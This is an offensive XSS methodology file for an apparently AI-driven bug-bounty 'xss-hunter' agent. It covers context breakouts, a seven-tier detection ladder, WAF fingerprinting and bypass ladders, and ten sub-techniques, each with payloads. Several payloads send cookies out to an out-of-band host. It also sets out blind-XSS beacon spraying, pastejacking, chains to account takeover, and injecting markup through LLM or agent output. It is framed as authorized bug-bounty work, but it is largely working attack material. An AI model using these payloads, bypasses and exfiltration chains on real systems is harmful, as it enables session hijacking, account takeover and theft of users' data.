# hunt-xss — NATIVE XSS methodology (single source of truth)

**This is the operator methodology the `xss-hunter` agent, `references/router.md`, and `references/mad-hunt.md` all point to.** Load it on CLASSIFY when the XSS row lights up. It replaces improvised payload-spraying with a disciplined loop: **classify context → climb the detection ladder → profile the WAF → run the right sub-technique → browser-verify → chain to impact.**

> **Overlap pick-order** (from `references/router.md`): `brain/payloads/xss.txt` + `xss-waf-bypass.txt` FIRST → dispatch the `xss-hunter` agent → only if stalled pull depth from `packs/strix/skills-internal/vulnerabilities/xss.md` (parser differentials / bypass matrices) or `packs/claude-bughunter/disclosed-reports/hunt-xss.md` (H1 disclosed-report $ patterns). This file is the spine; those are depth.
>
> **The one law that governs everything below:** a payload reflected with angle brackets **UNESCAPED** is XSS; `&lt;script&gt;` / `%3Cscript%3E` is correct output encoding, not a bug. **curl reflection is never proof — a browser must execute it** (§8). Blind/stored is never proof without an OOB callback (§6).

Boundary with `hunt-html-injection`: raw markup that renders but does **not** execute JS (no `<script>` / event-handler firing) is HTML injection — escalate here only once script execution is reachable.

---

## 1. Context classification FIRST

Payload choice is downstream of context. Send a probe canary — a unique random alnum string (8+ chars, no English/protocol words, e.g. `cpq7hx92`) plus the meta-probe `cpq7hx92"bbb'ccc<ddd>eee` + backtick — find where and how it lands, THEN pick the breakout. Search the **baseline (no-marker) response** for your marker first: if it appears naturally, it's a false-positive trap, pick another.

| Context | How to recognize it in the response | Breakout primitive | Representative proof |
|---------|-------------------------------------|--------------------|----------------------|
| **HTML body / element** | canary sits between tags: `<p>cpq7hx92</p>` | inject a fresh tag | `<svg onload=alert(91234)>` |
| **Attribute value** | canary inside `value="cpq7hx92"` / `href='cpq7hx92'` | close quote+tag, add handler | `" autofocus onfocus="alert(91234)` |
| **JS string** | canary inside `<script>var x='cpq7hx92'` | break the string literal | `'-alert(91234)-'` |
| **URL / href** | canary becomes a link/redirect target | scheme abuse | `javascript:alert(91234)` |
| **DOM sink** | canary never in server body; JS reads `location.*`/`name`/`postMessage` → `innerHTML`/`write`/`eval` | drive the source | `#<img src=x onerror=alert(91234)>` |
| **SVG / MathML** | served `image/svg+xml`, or `<svg>`/`<math>` survives a sanitizer | active-content tag | `<svg><script>alert(91234)</script></svg>` |
| **Markdown / rich-text** | comment/wiki/bio rendered from Markdown | scheme-in-link / raw-HTML passthrough | `[x](javascript:alert(91234))` |
| **Template literal (CSTI)** | `{{7*7}}` renders `49`; page uses AngularJS `ng-*` | sandbox escape | `{{constructor.constructor('alert(91234)')()}}` |
| **CSS / style** | canary inside `style="…"` or `<style>` | usually NOT JS-exec in modern browsers | treat as HTML-injection / data-exfil unless a JS sink exists |

Encoding contract per context (from `packs/strix/.../xss.md`): HTML text → encode `< > & " '`; attribute → encode + require quoting; URL/JS-URL → scheme allowlist (https/mailto/tel), block `javascript:`/`data:`; JS string → prefer `JSON.stringify`; SVG/MathML → treat as active content. Full context→payload index: **`brain/payloads/xss-by-context.md`**.

---

## 2. Detection ladder (7 tiers)

Climb from cheapest signal to hardest proof. **A negative `alert()` is NEVER a conclusion of "no XSS"** — it is one blocked rung. Filters that eat `alert` routinely pass `confirm`, `print`, a marker write, or a fetch.

| Tier | Probe | What it proves |
|------|-------|----------------|
| **1** | `alert(91234)` | classic exec; noisy, WAF-flagged |
| **2** | `confirm(91234)` / `prompt(91234)` | exec when `alert` is filtered |
| **3** | `console.log(91234)` | exec in headless/automation; read via `read_console_messages` |
| **4** | `document.title='XSS91234'` — DOM marker | exec proven by a DOM state change, no dialog needed |
| **5** | global write: `window.x91234=1` / `window.top.name='91234'` | exec + scope reach, survives dialog-suppression |
| **6** | OOB fetch: `fetch('//OOB/91234')` / `new Image().src='//OOB/?c='+document.cookie` | exec + exfil reachability + blind/headless proof |
| **7** | constructor / decode chains: `eval(atob('…'))`, `[]['filter']['constructor']('…')()`, `Function('…')()` | exec through sanitizer/CSP-gadget filtering that kills literal keywords |

**Rules of the ladder (enforced by the `xss-hunter` agent):**
- On a block, **jump 2 tiers**, don't nudge one — a blocked `alert` most often clears at tier 4 (DOM marker) or tier 6 (OOB), not tier 2.
- **Tiers 1, 2, 4, 6 must all be attempted** before concluding "not exploitable." Skipping the DOM-marker (4) and OOB (6) rungs is the #1 false-negative.
- DOM marker (tier 4) and OOB (tier 6) beat `alert` for reporting: they survive `window.alert` overrides, prove impact-beyond-popup, and work in headless verification.
- Blind/stored contexts start at tier 6 by definition — there is no local dialog to see (§6).

---

## 3. WAF-profile gate + bypass ladder

**Fingerprint the WAF BEFORE spraying payloads** — a mismatched payload burns your reflection point and trains the WAF. A block is a **PIVOT signal, never a stop** (mad-hunt.md adaptive-throttle: back off on 429/challenge, run the ladder, resume).

**Fingerprint (headers/cookies/block-page):**

| WAF | Tell | First trick |
|-----|------|-------------|
| **Cloudflare** | `cf-ray`, `server: cloudflare`, `__cf` cookies | TE + `X-Forwarded-Host`; unicode/entity-split event names |
| **Akamai** | `AkamaiGHost`, `ak_bmsc`/`_abck` cookies, `X-Akamai-*` | case-flip tags, `/**/` splits, `srcdoc` iframe |
| **AWS WAF** | `x-amzn-*`, `x-amz-cf-id` | `/**/` comment split, double-URL `%253C`, HTML-entity `&#0000000040;` |
| **F5 BIG-IP ASM** | `TS…` cookie, `BIGipServer` | double-slash, param-pollution, unquoted-attribute handlers |
| **Imperva** | `incap_ses`/`visid_incap` cookies, `X-Iinfo` | `%c0%2e` overlong, mixed-case, `atob()` chains |
| **Sucuri** | `x-sucuri-id`/`x-sucuri-cache`, "Access Denied - Sucuri" page | scheme obfuscation, non-`script` tags (`<track>`,`<details>`) |

`wafw00f` confirms if installed. WAF fingerprints and vendor tricks: **`references/vuln-playbooks.md` → `## 403 / 401 bypass`** (cf-ray→CF, x-amzn→AWS, TS→F5, incap_ses→Imperva).

**7-level bypass ladder — record the result at every level** (`class:xss level:<n> result:<blocked|passed> signal:<waf-tell>` → `brain.sh note`). Do not skip levels; a level that passes is intel about *what* the WAF normalizes.

1. **Case / whitespace:** `<ScRiPt>`, `<svg/onload=…>`, `<img\tsrc=x\tonerror=…>`, newline-split event names (`onToGgle%0A=`).
2. **Tag/handler swap:** WAFs tuned for `<script>`/`onerror` miss `<svg onload>`, `<video>/<audio> onerror`, `<details ontoggle>`, `<track onerror>`, `<input autofocus onfocus>`, `<body onpageshow>`.
3. **Encoding matrix:** URL, **double-URL `%253C`**, HTML-entity (`&#0000000040;` for `(`, `&sol;` for `/`), unicode-escape-then-URL, mixed. (mad-hunt.md Depth-Engine variant matrix.)
4. **String / keyword splitting:** `alert`, `top['al'+'ert']`, `self['wind'+'ow']`, `/ale/.source+/rt/.source`.
5. **Decode chains:** `eval(atob('…'))`, `Function(atob('…'))()`, `String.fromCharCode(...)`, `decodeURIComponent(...)` — defeats literal-keyword filters (tier 7).
6. **Constructor / gadget:** `[]['filter']['constructor']('…')()`, `alert.constructor.constructor('return this')()`, JSONP gadget on a CSP-allowlisted host (§4-H).
7. **Alternate vector / context pivot:** move to a different sink entirely — header reflection, DOM sink, SVG upload, cache-poisoned response, `postMessage`. If input WAF blocks `<` everywhere on output paths, the app may simply be hardened — don't invent a bypass (§10).

Payload bank for every level: **`brain/payloads/xss-waf-bypass.txt`** (84 curated coffinxp/MrHex/CYBERTIX evasion payloads) + `brain/payloads/xss-by-context.md` "WAF-evasion set."

---

## 4. The 10 sub-techniques (A–J)

Each = one paragraph, a trigger condition, and a representative payload. Depth for any of these: `packs/claude-bughunter/disclosed-reports/hunt-xss.md`.

**A — Reflected / DOM (server vs client).** Reflected = URL/param/header echoes into HTML unencoded; DOM = client JS reads a source (`location.hash`/`search`, `window.name`, `document.referrer`, imported JSON) into a sink (`innerHTML`, `document.write`, `eval`, `setTimeout(str)`, `srcdoc`) with no round-trip to the server — server-side scanners and most WAFs miss it entirely. *Trigger:* canary lands raw in body (reflected) OR never appears server-side but a JS sink consumes a source (DOM). *Payload:* reflected `"><svg onload=alert(91234)>` · DOM `https://target/p#<img src=x onerror=alert(91234)>`.

**B — postMessage → sink.** A `window.addEventListener('message', h)` whose `h` skips `event.origin` (or checks it with `indexOf`/`startsWith`/`endsWith` that `target.attacker.com` defeats) and feeds message data to a DOM sink or `eval`. *Trigger:* grep the SPA for `addEventListener('message'` with no strict-equality origin check. *Payload:* attacker page iframes/opens target, then `frame.postMessage('<img src=x onerror=alert(91234)>','*')`. No CSP violation — postMessage is a legitimate cross-origin channel.

**C — Mutation XSS (mXSS / DOMPurify family).** Markup that is inert to the sanitizer's parser but mutates into live HTML when the browser re-parses it (namespace flip HTML→SVG/MathML, or an `innerHTML` round-trip re-serializing sanitized DOM). *Trigger:* app runs DOMPurify/sanitize-html then re-reads `element.innerHTML`, or allows `<style>` beside `<svg>`/`<math>`. *Payload:* `<svg><style><img src=x onerror=alert(91234)></style></svg>` or `<noscript><p title="</noscript><img src=x onerror=alert(91234)>">`. Iterate against the sanitizer's exact version.

**D — OAuth `returnTo` / redirect-driven XSS.** A `returnTo`/`redirect`/`next`/`ReturnUrl` param on a signin/callback route is reflected into an href or client-side `location=` without scheme validation → `javascript:` executes on the trusted auth origin. *Trigger:* auth flow with an attacker-controllable return param. *Payload:* `?returnTo=javascript:alert(document.domain)` · `?next=javascript://%0aalert(91234)`. Redirect-XSS payloads: `brain/payloads/redirect.txt` + `open-redirect.txt`.

**E — Prototype-pollution → DOM XSS.** Attacker pollutes `Object.prototype` (via `__proto__`/`constructor.prototype` in a query string, JSON body, or merge/`extend`) so a gadget in the app/library later reads the polluted property into a sink (`innerHTML`, script `src`, sanitizer config). *Trigger:* client-side deep-merge of user JSON, or a `?__proto__[x]=` param that survives. *Payload:* `?__proto__[innerHTML]=<img src=x onerror=alert(91234)>` (gadget-dependent) — pair with a known library gadget.

**F — Stored XSS chains.** Payload persists in a field (comment, username, ticket title, label, order note, filename) and executes when *another* user — ideally privileged — renders it. *Trigger:* any field whose value later displays in someone else's page, especially cross-tenant or admin views. *Payload:* store `"><svg onload=fetch('//OOB/91234?c='+document.cookie)>`, then load the rendering page as the victim role. One payload, many victims = payout multiplier (§6, §7).

**G — SVG / file-upload XSS.** SVG is XML: carries `<script>` natively and HTML via `<foreignObject>`; image validators that only check magic bytes/first-frame accept it; CSP frequently doesn't cover `image/svg+xml` responses. Same-origin serving = full session-cookie access. *Trigger:* avatar/badge/thumbnail upload accepting SVG, served at a same-origin URL. *Payload:* upload `<svg xmlns="http://www.w3.org/2000/svg"><script>fetch('//OOB/?c='+document.cookie)</script></svg>`, visit the served URL as a top-level navigation. Also EXIF: `exiftool -Comment='"><img src=x onerror=alert(91234)>' shot.jpg` for metadata-rendering admin panels.

**H — Trusted-Types / CSP bypass.** Under strict CSP, exec comes from a policy-compliant gadget, not inline injection: a JSONP endpoint on a `script-src`-allowlisted host (`<script src="https://www.google.com/complete/search?client=hp&callback=alert(91234)">`), `strict-dynamic` trusting a script created by an already-trusted script, `<base>`-tag retargeting, or a custom Trusted-Types policy that returns unsanitized strings / a sink TT doesn't cover (CSS, URL). *Trigger:* CSP present but allowlists a JSONP-bearing origin, uses `strict-dynamic` with a DOM `createElement('script')` path, or a lax `trustedTypes` policy. *Payload:* the allowlisted-JSONP `<script src>` above, or `appendChild` of a `<script>` whose `src` you control under `strict-dynamic`.

**I — Markdown-renderer XSS.** `marked`/`markdown-it`/`commonmark`/`kramdown`/`markdown-to-jsx` with raw-HTML passthrough enabled or a scheme-filter gap. *Trigger:* comments/issues/wiki/bio rendered from Markdown. *Payload:* `[x](javascript:alert(91234))`, `![x](javascript:alert(91234))`, or raw `<img src=x onerror=alert(91234)>` in the body; diagram pipelines (Kroki/Mermaid/PlantUML) that embed unescaped labels.

**J — RSC / Server-Actions / agentic-LLM output rendering.** Modern render paths that dump semi-trusted strings into the DOM: React Server Components / SSR-hydration mismatches re-interpreting content, `dangerouslySetInnerHTML` fed from a Server Action, or an LLM/agent response rendered as HTML/Markdown without sanitization (indirect prompt → injected markup → exec in the app origin). *Trigger:* SSR/RSC app with `dangerouslySetInnerHTML`/`v-html`/`{@html}` fed by server or model output; chatbot/agent output rendered rich. *Payload:* seed the model/server source with `<img src=x onerror=alert(91234)>` and confirm it survives to a client sink. Swagger-UI `?configUrl=` DOM XSS (loads attacker JSON → `alert(localStorage.getItem('authToken'))`) is a real instance of "config/output rendered as trusted" — see `packs/writeups/the-dark-side-of-swagger-ui-….md`.

---

## 5. 2024–2026 CVE catalog

Provenance is explicit so nothing here is a fabricated number. **✓src** = the CVE/identifier appears verbatim in a source read for this doc → cite freely. **◇cat** = carried from the operator catalog / published-advisory knowledge but NOT in this repo's read sources → **verify the exact ID against the advisory before putting it in a client report** (anti-fabrication rule: describe the class, don't assert an unverified number).

| ID | Class | What it teaches | Provenance |
|----|-------|-----------------|------------|
| **CVE-2025-4123** | Grafana client path traversal → XSS + open-redirect + client-SSRF | path handling flaw loads an attacker plugin manifest → remote JS on the Grafana origin → ATO; patched 11.0.1 | **✓src** `packs/writeups/how-one-path-traversal-in-grafana-….md` |
| **CVE-2022-32209** | Rails `rails-html-sanitizer` / Nokogiri mXSS | canonical "incomplete sanitizer fix bypassed by a slight variation" — style+tag-combo mXSS | **✓src** hunt-xss `SKILL.md` (Common Root Causes #6) |
| Swagger-UI `?configUrl=` (Jamf Pro) | DOM XSS via remote config load | attacker JSON via `configUrl` → JS on the docs origin → `localStorage.authToken` exfil. Source states "the Jamf Pro CVE" without a number → **use the class, not a fabricated ID** | ✓src (class) `packs/writeups/the-dark-side-of-swagger-ui-….md` |
| **CVE-2024-47875 / CVE-2024-45801** | DOMPurify mXSS / nesting-depth bypass family | sanitizer-bypass mutation XSS in a widely-embedded library — the live 2024 instance of sub-technique C | ◇cat — verify advisory |
| **CVE-2024-21535** | `markdown-to-jsx` XSS | markdown renderer emits executable markup — sub-technique I | ◇cat — verify advisory |
| **CVE-2025-55182 (react2shell)** | RSC Flight-protocol insecure deserialization (unauth RCE, CVSS 10.0) — **not XSS but SAME origin-detection surface**: any target with Next.js App Router / react-server-dom-{parcel,webpack,turbopack} 19.0-19.2.0 | Flag during XSS recon (shodan/fofa fingerprint `X-Powered-By: Next.js`, `react.production.min.js`); dispatch to `rce-hunter` with the packs/writeups reference | **✓src** `packs/writeups/from-recon-to-rce-hunting-react2shell-cve-2025-55182-for-bug-bounties.md` |
| nextjs-auth0 `returnTo` | open-redirect / XSS via auth return param | the `returnTo` breakout of sub-technique D in a real SDK | ◇cat — verify advisory |
| React Server Components / Server-Actions render | untrusted server/model output → client sink | the RSC face of sub-technique J | ◇cat — verify advisory |
| listmonk stored-XSS chain | stored payload in a mailing/admin surface → privileged viewer | template/stored chain of sub-technique F | ◇cat — verify advisory |

Rule: in a report, cite only a CVE ID you have re-read from its advisory. For ◇cat rows, hunt the class and attach the advisory yourself before naming the number.

---

## 6. Blind & stored XSS

**OOB-or-it-didn't-happen.** Blind/stored claims require an out-of-band callback — the same gate as blind SSRF. The receiver fires only when the payload actually executes in *some* browser (an admin viewing logs, a SOC analyst opening a ticket, an email rendering the stored payload). Your `curl` will never execute JS, so a reflected payload alone is a hypothesis, not a finding.

**What IS confirmation:** a request to your unique Collaborator/interactsh subdomain, with a **browser** User-Agent (Mozilla/Chrome, not the server's HTTP client), arriving from a non-target IP (the analyst's office/VPN) — often **hours or days later**. Plant beacons early, keep the listener open. **What is NOT:** payload echoed HTML/URL-encoded; ASP.NET request-validator 500/403 on `<`; `%22onclick%3D…` sitting inert in an attribute (browsers don't URL-decode inside HTML attribute values).

**Sub-tag every beacon by sink** so a callback names the firing path: `<svg onload=fetch('//bxss-{sink}-{rand}.OOB/x')>`. Where to plant:
- Error-message params (`?ErrorMessage=`, `?Source=`, `?ReturnUrl=`), login username (audit-log viewer), User-Agent / Referer headers (SOC dashboards that render them), registration/contact emails, **file-upload filenames**, EXIF metadata (§4-G).
- Automate header spraying: Burp Match&Replace on `User-Agent`/`Referer`/`X-Forwarded-For`, or `subfinder … | gau | bxss -payload '…' -header 'X-Forwarded-For'`. (`packs/writeups/mastering-blind-xss-….md`.)

**Pastejacking / clipboard XSS** (`packs/writeups/blind-xss-through-pastejacking-….md`): an attacker page writes `text/html` to the clipboard (`e.clipboardData.setData('text/html', '<img src=x onerror=…>')`); a victim pasting into a rich-text/`contenteditable` field whose paste handler does `el.innerHTML = clipboardData.getData('text/html')` executes it — becomes blind-XSS when stored and an admin later views it. Only works on rich-text/`contenteditable`/WYSIWYG sinks, never plain `<input>`/`<textarea>`.

**Where stored payloads render for OTHER users — crown-jewel surfaces** (highest payout = privileged context × persistent delivery × scope escalation): admin panels & authenticated dashboards, SSO/signin pages (token theft platform-wide), payment/checkout flows, multi-tenant SaaS boundaries (`*.myshopify.com`-class cross-tenant bleed), collaborative content (wikis, issue trackers, labels, tickets) where one payload infects every viewer, and support/CRM consoles a privileged agent opens.

---

## 7. Chain templates

Standalone XSS pays Low–Medium on mature programs; chains that reach ATO/privilege-escalation pay 5–20×. On every confirmed XSS ask: *what state-changing endpoint or token store does this JS now reach, and who sees it?* After a CONFIRMED finding, dispatch the **chain-builder** role (`references/mad-hunt.md` §6 ESCALATE) and re-verify each link.

| Chain | A → … → terminal | Primitive |
|-------|------------------|-----------|
| **XSS → ATO (cookie/token theft)** | XSS on origin → read `document.cookie` / `localStorage` token → exfil via `fetch`/`Image()` → session hijack | non-HttpOnly cookie or JS-readable token (e.g. Jamf `authToken`, OAuth-implicit `#access_token` in the fragment) |
| **XSS → CSRF-token read → state change** | XSS `fetch('/settings')` reads the anti-CSRF token from the DOM/response → forges the state-changing POST same-origin | same-origin XHR defeats SameSite=Lax + CSRF tokens |
| **XSS → admin action / privilege-escalation** | stored XSS in shared content → fires in a privileged viewer's session → XHR to admin-only endpoints → promote attacker / exfil secrets | privileged viewer × cross-privilege stored content (§6) |
| **Blind-XSS → internal panel** | beacon planted in a logged field → executes in an internal SOC/admin console → internal session theft, pivot | OOB callback from an internal browser (§6) |
| **Self-XSS → effective stored XSS** | self-XSS in a profile field + CSRF/login-CSRF/clickjack sets that field for the victim → runs in victim context | rescues an otherwise-dead self-XSS (§10) |
| **Reflected + cache-poisoning → stored-at-CDN-scale** | reflected XSS on a cacheable response + unkeyed input (`X-Forwarded-Host`) → poisons the edge cache → every visitor for the TTL | Kettle-class; cross-ref `hunt-cache-poison` |

Discipline gate (from `SKILL.md`): do not file XSS as **Critical** without demonstrating the terminal impact (ATO / token exfil / privilege-escalation); it's **Medium** otherwise.

---

## 8. Browser-verify gate (mandatory)

**curl reflection ≠ proof.** A payload can echo raw in Burp and still fail in a real browser — CSP, framework auto-escaping, context mismatch, WAF normalization, or HTML-parser differences. **Every client-side finding is verified in a real browser before it ships.** Drive a real browser yourself per `references/mad-hunt.md` §5 Client-side verification (open the reflected URL headed, capture DOM markers / console / network); survivors then go to the adversarial **`agents/t3-verifier.md`** (REFUTE — try to kill it with benign explanations, blocking controls, inflated severity).

- **Prefer DOM markers / OOB over `alert`** (tiers 4/6): they survive `window.alert` suppression, prove impact-beyond-popup, and work headless. Read exec via the browser tools' console/network (`read_console_messages`, `read_network_requests`).
- **Note:** no shipping browser has an "XSS auditor" (Chrome's was removed in v78 / Oct 2019) — never attribute a failed PoC to one.

**Evidence contract (all six, or it's not a finding):**
1. Endpoint + exact parameter/field/header.
2. The exact executing payload (copy-paste).
3. The rendering context (§1) and the sink.
4. Impact beyond popup — what the JS reads/does (cookie/token, CSRF-token, admin XHR), stated concretely (Gate-0: "I can read `document.cookie` = the admin session token").
5. Reproducible from a fresh context in ≤10 min — self-contained PoC URL/steps, fires in current Chrome/Firefox.
6. The victim role — whose browser/session executes it (self, other user, admin). For stored/blind, the OOB callback (§6).

---

## 9. Source-code review patterns

When you have code, grep the sinks and the unsafe listeners directly. `ripgrep` for triage, `semgrep`/`ast-grep` for flow.

**DOM sinks (JS/TS):**
```bash
rg -n "innerHTML|outerHTML|insertAdjacentHTML|document\.write|\.write\(|eval\(|setTimeout\(['\"\`]|setInterval\(['\"\`]|new Function\(|location\.(hash|search|href)|document\.referrer|\$\(location|\.html\(" --glob '*.{js,ts,jsx,tsx,vue,svelte}'
```
**Framework raw-HTML sinks:**
```bash
rg -n "dangerouslySetInnerHTML|v-html|\{@html|\$sce\.trustAsHtml|trustAsHtml|bypassSecurityTrust" --glob '*.{js,ts,jsx,tsx,vue,svelte,html}'
```
**Unsafe postMessage listeners (origin check missing/weak):**
```bash
rg -n "addEventListener\(['\"]message['\"]" -A6 | rg -n "event\.data|e\.data" ; \
rg -n "\.origin\.(indexOf|startsWith|endsWith|includes)" --glob '*.{js,ts}'   # weak origin checks
```
**Server-side / template raw output:**
```bash
rg -n "html_safe|raw\(|sanitize|translate|\bt\(|render_inline" --glob '*.{erb,rb,haml}'   # Rails
rg -n "\|safe|autoescape false|mark_safe|Markup\(|render_template_string" --glob '*.{html,py,jinja,j2}'
```
**semgrep / ast-grep starting points:**
```
semgrep --config p/xss
semgrep -e 'element.innerHTML = $X' --lang js
ast-grep -p 'window.addEventListener("message", $HANDLER)' -l js
```
Chase each hit source→sink: does an untrusted source (`location.*`, `postMessage`, request param, DB field, model output) reach the sink without encoding/sanitization? Reflection-point recon signals: `document.write(`, `innerHTML =`, `location.hash/search`, `$.html(`, and weak-defense headers (`X-XSS-Protection: 0`, absent/`unsafe-inline` CSP, `image/svg+xml` without `nosniff`).

---

## 10. Classification discipline (kill the non-findings)

Do NOT file — each is a triage downgrade-to-N/A trap:
- **Self-XSS with no chain.** Fires only in the attacker's own session. Zero, UNLESS chained via CSRF/login-CSRF/clickjack to run in a victim context (§7) — then attach the working chain/PoC video.
- **Dead / encoded reflection.** Canary comes back `&lt;script&gt;` / `%3Cscript%3E`, or in a `text/plain`/`application/json` response the browser renders as inert text. That's correct output encoding — save the response, open it in a browser, no exec = not XSS.
- **Input-WAF block mistaken for "needs a bypass."** A request-validator/WAF 403/500 on `<` blocks *input* before it reaches any output path. Finding an alternate-character route just delivers the request to be safely encoded later. If EVERY output path encodes, it's a hardened app — don't fabricate a bypass (lesson: authorized SharePoint engagement, request-validator blocks `<` pre-storage, encoding bypasses do not help).
- **CSP-blocked with no bypass.** Payload injects but CSP stops execution and no gadget/JSONP/`strict-dynamic`/`unsafe-inline`/SVG path bypasses it → record the policy, move on. Don't claim exec you can't demonstrate.
- **Attacker-owned-content-only.** Payload only "executes" in content the attacker fully controls and no other user renders (your own sandbox, a preview only you see) — no victim, no finding.
- **Natural-language collision.** The canary substring appears in the baseline response independent of your input (dictionary word, pagination echo). Use a 32-hex random marker; confirm your input *drove* the reflection before escalating.

7-Question Gate before any submission (`references/mad-hunt.md` §5): usable now? impact on the program's list? real consequence? reproducible from fresh context? attacker-attainable? triager would pay? Any "no" kills it.

---

## 11. Payloads & brain

**Payload sources (pick-order):**
- **Context-organized index → start here:** `brain/payloads/xss-by-context.md` (breakout per context §1, WAF set, OOB set).
- **Raw banks:** `brain/payloads/xss.txt` (1592 lines) · `brain/payloads/xss-waf-bypass.txt` (84 WAF-evasion payloads for §3) · `javascript:`/redirect vectors in `brain/payloads/redirect.txt` + `open-redirect.txt`.
- **403/WAF vendor tricks:** `references/vuln-playbooks.md` → `## 403 / 401 bypass`.
- **Depth on stall:** `packs/strix/skills-internal/vulnerabilities/xss.md` (parser differentials, bypass matrices) · `packs/claude-bughunter/disclosed-reports/hunt-xss.md` (H1 $ patterns) · the four `packs/writeups/*xss*`/`swagger`/`grafana`/`pastejacking` writeups.

**Brain calls (bash, not python — the real interface here is `scripts/brain.sh`):**
```bash
bash scripts/brain.sh recall <target>                          # prior XSS findings, EXHAUSTED vectors, lessons, payload classes
bash scripts/brain.sh note <target> "class:xss level:4 result:blocked signal:cf-ray"   # coverage / per-level record
bash scripts/brain.sh finding <target> "stored XSS in <field> → admin cookie exfil (verifier-passed)"
bash scripts/brain.sh exhausted <target> "reflected q= param: encoded on all output paths, hardened"
bash scripts/brain.sh learn "<reusable XSS heuristic>"         # global lesson
bash scripts/brain.sh payload xss <file>                       # fold a new payload list into the bank (deduped)
```
Recall first, capture last. Fold every new working evasion back into the bank so the next hunt starts ahead.

---

### Cross-links
- Dispatch & pick-order: `references/router.md` (XSS row: `xss` + `xss-waf-bypass` payloads, `xss-hunter` agent, Strix · CBH depth, "browser-verify before ship").
- Autonomous loop / verify & chain roles: `references/mad-hunt.md` (§4 hunt, §5 VALIDATE = 7-Q + browser-verify + `agents/t3-verifier.md`, §6 ESCALATE = chain-builder).
- Report assembly: `references/report-template.md` → `agents/t3-reporter.md`.
- Related classes: `hunt-cache-poison` (reflected→stored), `hunt-csrf` (self-XSS rescue + token forge), `hunt-oauth` (returnTo / fragment-token chains), `hunt-file-upload` (SVG), `hunt-html-injection` (markup that doesn't execute).
